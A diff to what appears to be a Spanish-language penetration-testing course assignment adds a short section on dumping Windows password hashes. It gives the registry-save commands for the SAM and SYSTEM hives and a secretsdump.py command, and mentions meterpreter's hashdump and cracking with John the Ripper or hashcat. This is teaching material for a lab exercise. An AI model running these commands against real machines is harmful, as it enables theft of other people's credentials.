@@ -212,6 +212,23 @@ Diferencia:
 
 - Rainbow Tables son más rápidas, pero limitadas por el tipo de hash y su tamaño.
 
+### **"Añadido"**
+---
+
+Existe una forma mucho más sencilla de obtener los hashes de windows
+Si nosotros ponemos en nuestra powershell usando el adminsitrador, podremos copiar en unos archivos la información del SAM y del SYSTEM
+
+````
+reg save HKLM\SAM sam.save
+````
+````
+reg save HKLM\SYSTEM system.save
+````
+Ahora teniendo estas copias, existe una herramienta llamada **secretsdump.py**, que nos dará los hashes, haciendo uso del siguiente comando:
+````
+secretsdump.py -sam sam.save -system system.save LOCAL
+````
+* Quiero aclarar que esta herramienta y hashdump en meterpreter (meterpreter es un troyano que me permite hacer funcinalidades al que puedo tirarle funcionalidades), va a volcar los hashes para poder descifrarlos con herramientas como jonh the ripper o hashcat.
 
 
 ## 3. Desarrollar el proceso completo de explotación sobre la máquina Windows 2008. El alumno deberá identificar todas las posibles vulnerabilidades para el acceso a la máquina, así como la elevación de privilegios en la misma. 
